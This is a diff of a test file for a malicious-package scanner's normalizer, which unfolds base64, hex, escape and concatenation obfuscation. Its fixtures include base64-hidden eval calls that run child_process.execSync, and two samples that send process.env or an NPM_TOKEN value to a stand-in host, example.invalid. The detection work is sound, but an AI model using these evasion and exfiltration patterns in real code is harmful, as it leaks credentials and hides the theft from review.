@@ -2,7 +2,7 @@ import { readFileSync } from "node:fs";
 import { fileURLToPath } from "node:url";
 import { dirname, join } from "node:path";
 import { describe, expect, test } from "vitest";
-import { normalizeCodeForScanning } from "../server/lib/review/rules/normalize";
+import { normalizeCodeForScanning, withNormalizeMemo } from "../server/lib/review/rules/normalize";
 import { computeRisk, createPackageDiff, deterministicFindings } from "../server/lib/review";
 
 const __dirname = dirname(fileURLToPath(import.meta.url));
@@ -377,11 +377,13 @@ describe("normalizeCodeForScanning", () => {
     expect(normalizeCodeForScanning(source)).toBe(source);
   });
 
-  test("does not fold a concatenation that spans a newline (line numbers stay stable)", () => {
-    const source = "const p = 'chi' +\n  'ld_process';";
-    const normalized = normalizeCodeForScanning(source);
-    expect(normalized).toBe(source);
-    expect(normalized.split("\n").length).toBe(source.split("\n").length);
+  test("folds a concatenation that spans lines onto its first line, keeping the line count", () => {
+    expect(normalizeCodeForScanning("const p = 'chi' +\n  'ld_process';")).toBe(
+      'const p = "child_process"\n;',
+    );
+    expect(normalizeCodeForScanning("const p = 'chi' +\r\n  'ld_process';")).toBe(
+      'const p = "child_process"\r\n;',
+    );
   });
 
   test("preserves line count for a folded multi-line file", () => {
@@ -490,5 +492,238 @@ describe("assembled-identifier evasion is caught by the deterministic scanner", 
     const findings = deterministicFindings(staged, createPackageDiff([], staged));
 
     expect(findings.some((finding) => finding.ruleId === "code.process-execution")).toBe(false);
+  });
+});
+
+describe("literal decode folds", () => {
+  const b64 = (text) => Buffer.from(text, "utf8").toString("base64");
+  const hex = (text) => Buffer.from(text, "utf8").toString("hex");
+
+  test("folds each standard decoder of a literal to the text it decodes to", () => {
+    expect(normalizeCodeForScanning(`atob("${b64("child_process")}")`)).toBe('"child_process"');
+    expect(normalizeCodeForScanning(`window.atob('${b64("child_process")}')`)).toBe(
+      '"child_process"',
+    );
+    expect(
+      normalizeCodeForScanning(`Buffer.from('${b64("child_process")}', 'base64').toString()`),
+    ).toBe('"child_process"');
+    expect(
+      normalizeCodeForScanning(`Buffer.from('${hex("child_process")}', 'hex').toString('utf8')`),
+    ).toBe('"child_process"');
+    expect(
+      normalizeCodeForScanning(
+        `Buffer.from('${Buffer.from("a?b>c").toString("base64url")}', 'base64url')`,
+      ),
+    ).toBe('"a?b>c"');
+    expect(normalizeCodeForScanning("String.fromCharCode(0x68, 105)")).toBe('"hi"');
+    expect(normalizeCodeForScanning("String.fromCodePoint(104, 105)")).toBe('"hi"');
+    expect(normalizeCodeForScanning("decodeURIComponent('%63hild%5Fprocess')")).toBe(
+      '"child_process"',
+    );
+    expect(normalizeCodeForScanning("unescape('%u0063hild_process')")).toBe('"child_process"');
+  });
+
+  test("reads a lone escaped literal as its value", () => {
+    expect(normalizeCodeForScanning("require('\\x63hild_\\u0070rocess')")).toBe(
+      'require("child_process")',
+    );
+  });
+
+  test("composes with concatenation on either side of the decode", () => {
+    expect(normalizeCodeForScanning(`require(atob("${b64("child_")}") + 'process')`)).toBe(
+      'require("child_process")',
+    );
+    const encoded = b64("child_process");
+    expect(normalizeCodeForScanning(`atob('${encoded.slice(0, 8)}' + '${encoded.slice(8)}')`)).toBe(
+      '"child_process"',
+    );
+  });
+
+  test("leaves binary decodes, re-encodes and non-literal arguments alone", () => {
+    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).toString("base64");
+    for (const source of [
+      `atob("${png}")`,
+      `Buffer.from("${b64("x")}", "base64").toString("hex")`,
+      "atob(encoded)",
+      "Buffer.from(data, 'base64')",
+      "String.fromCharCode(...codes)",
+      "custom.atob('aGk=')",
+    ]) {
+      expect(normalizeCodeForScanning(source)).toBe(source);
+    }
+  });
+
+  test("splices a decode that a code-running call consumes in as code", () => {
+    const payload = "const cp = require('child_process');\n// run it\ncp.execSync(\"id\");";
+    for (const wrapper of [
+      (d) => `eval(${d})`,
+      (d) => `eval?.(${d})`,
+      (d) => `(0, eval)(${d})`,
+      (d) => `new Function('a', ${d})`,
+      (d) => `vm.runInThisContext(${d})`,
+    ]) {
+      const normalized = normalizeCodeForScanning(
+        `x();\n${wrapper(`atob("${b64(payload)}")`)};\ny();`,
+      );
+      expect(normalized).toContain("require('child_process')");
+      expect(normalized).toContain('cp.execSync("id")');
+      expect(normalized).not.toContain("run it");
+      expect(normalized.split("\n")).toHaveLength(3);
+    }
+  });
+
+  test("unwraps nested encodings one level a pass", () => {
+    const inner = `eval(atob("${b64("require('child_process').execSync('id')")}"))`;
+    expect(normalizeCodeForScanning(`eval(atob("${b64(inner)}"))`)).toContain(
+      "require('child_process').execSync('id')",
+    );
+  });
+
+  test("keeps a decoded source with an HTML-like comment as a string", () => {
+    const normalized = normalizeCodeForScanning(`eval(atob("${b64("a <!--b\nfetch(u)")}"))`);
+    expect(normalized).toBe('eval("a \\x3C!--b\\nfetch(u)")');
+  });
+
+  test("survives a decode argument list too long to spread", () => {
+    const codes = Array.from({ length: 150_000 }, () => "104").join(",");
+    expect(() => normalizeCodeForScanning(`String.fromCharCode(${codes})`)).not.toThrow();
+    const allowed = Array.from({ length: 20_000 }, () => "104").join(",");
+    expect(normalizeCodeForScanning(`String.fromCharCode(${allowed})`)).toBe(
+      `"${"h".repeat(20_000)}"`,
+    );
+  });
+
+  test("folds a decode written across lines, a template argument and UTF-8 text", () => {
+    const payload = "require('child_process').execSync('id') // \u{1F600}";
+    expect(normalizeCodeForScanning(`eval(atob(\n  "${b64(payload)}"\n));`)).toBe(
+      "eval((require('child_process').execSync('id')  )\n\n);",
+    );
+    expect(normalizeCodeForScanning(`atob(\`${b64("child_process")}\`)`)).toBe('"child_process"');
+  });
+
+  test("escapes a stray control character instead of refusing the fold", () => {
+    const payload = "require('child_process') /*\u0001*/";
+    expect(normalizeCodeForScanning(`x = atob("${b64(payload)}")`)).toBe(
+      "x = \"require('child_process') /*\\u0001*/\"",
+    );
+    expect(normalizeCodeForScanning(`eval(atob("${b64(payload)}"))`)).toBe(
+      "eval((require('child_process')  ))",
+    );
+  });
+
+  test("never splices a decoded source that leaves a token open", () => {
+    const poison = `eval(atob("${b64('"')}"));`;
+    const inner = `eval(atob(atob("${b64(b64("require('child_process')"))}")));`;
+    const normalized = normalizeCodeForScanning(`${poison} ${inner}`);
+    expect(normalized).toContain('eval("\\"");');
+    expect(normalized).toContain("eval((require('child_process')))");
+  });
+
+  test("never splices a join that a comment inside a template substitution would leave open", () => {
+    const poison = `eval(atob("${b64("`${ // c\nx}`")}"));`;
+    const normalized = normalizeCodeForScanning(
+      `${poison}\nrequire(atob("Y2hp" + "bGRfcHJvY2Vzcw=="));`,
+    );
+    expect(normalized).toBe('eval("`${ // c\\nx}`");\nrequire("child_process");');
+  });
+
+  test("never splices a decoded source with unbalanced brackets", () => {
+    for (const payload of ["f(", "a]", "{ x()", "g(])"]) {
+      expect(normalizeCodeForScanning(`eval(atob("${b64(payload)}"))`)).toBe(
+        `eval(${JSON.stringify(payload)})`,
+      );
+    }
+    expect(normalizeCodeForScanning(`eval(atob("${b64("f([{}])")}"))`)).toBe("eval((f([{}])))");
+  });
+
+  test("keeps a member fold across a Unicode line separator unfolded", () => {
+    const source = "globalThis['re' + 'quire']";
+    expect(normalizeCodeForScanning(source)).toContain(" ");
+  });
+
+  test("reads octal and identity escapes", () => {
+    expect(normalizeCodeForScanning("require('\\143hild_process')")).toBe(
+      'require("child_process")',
+    );
+    expect(normalizeCodeForScanning("require('chil\\d_process')")).toBe('require("child_process")');
+    expect(normalizeCodeForScanning("const s = 'it\\'s\\n';")).toBe("const s = 'it\\'s\\n';");
+  });
+
+  test("never spells an HTML-like comment marker in folded text", () => {
+    expect(normalizeCodeForScanning("const m = '\\x3C!--';")).toBe('const m = "\\x3C!--";');
+    expect(normalizeCodeForScanning(`const m = atob("${b64("--> x")}");`)).toBe(
+      'const m = "--\\x3E x";',
+    );
+  });
+
+  test("folds no decodes when decoding is off", () => {
+    const source = `Buffer.from('${b64("child_process")}', 'bas' + 'e64')`;
+    expect(normalizeCodeForScanning(source, { decode: false })).toBe(
+      `Buffer.from('${b64("child_process")}', "base64")`,
+    );
+  });
+});
+
+describe("withNormalizeMemo", () => {
+  test("returns the same folds inside a scan, per decode option, and nests", () => {
+    const source = `x = atob("${Buffer.from("child_process").toString("base64")}") + 'a' + 'b';`;
+    const plain = normalizeCodeForScanning(source);
+    const undecoded = normalizeCodeForScanning(source, { decode: false });
+    expect(plain).not.toBe(undecoded);
+    const inScan = withNormalizeMemo(() => [
+      normalizeCodeForScanning(source),
+      normalizeCodeForScanning(source, { decode: false }),
+      withNormalizeMemo(() => normalizeCodeForScanning(source)),
+      normalizeCodeForScanning(source),
+    ]);
+    expect(inScan).toEqual([plain, undecoded, plain, plain]);
+  });
+
+  test("ends the scan when the callback throws", () => {
+    expect(() =>
+      withNormalizeMemo(() => {
+        throw new Error("boom");
+      }),
+    ).toThrow("boom");
+    expect(withNormalizeMemo(() => normalizeCodeForScanning("'a' + 'b'"))).toBe('"ab"');
+  });
+});
+
+describe("decoded payloads keep their capability findings", () => {
+  const stagedJs = (textSample) => [
+    { path: "index.js", size: textSample.length, sha256: "index-js", flags: [], textSample },
+  ];
+  const ruleIds = (textSample) => {
+    const staged = stagedJs(textSample);
+    return new Set(
+      deterministicFindings(staged, createPackageDiff([], staged)).map((f) => f.ruleId),
+    );
+  };
+
+  test("an eval'd base64 payload still reads as credential exfiltration", () => {
+    const payload =
+      "const https = require('https');\nhttps.request('https://example.invalid/c').end(JSON.stringify(process.env));";
+    const ids = ruleIds(
+      `eval(atob(${JSON.stringify(Buffer.from(payload).toString("base64"))}));\n`,
+    );
+    expect(ids).toContain("code.network-access");
+    expect(ids).toContain("code.credential-access");
+    expect(ids).toContain("code.dynamic-evaluation");
+  });
+
+  test("a folded comment marker does not turn commented-out calls into findings", () => {
+    const ids = ruleIds(
+      "/**\n * @example fetch('https://example.invalid/x')\n * new Function('x')\n */\n" +
+        "export const marker = '\\x3C!--';\n",
+    );
+    expect([...ids]).toEqual([]);
+  });
+
+  test("an assembled decode encoding still counts as a decode", () => {
+    const ids = ruleIds(
+      "const names = Buffer.from('TlBNX1RPS0VO', 'bas' + 'e64').toString().split(',');\n" +
+        "fetch('https://example.invalid/k', { method: 'POST', body: names.map((n) => process.env[n]).join() });\n",
+    );
+    expect(ids).toContain("code.dynamic-evaluation");
   });
 });
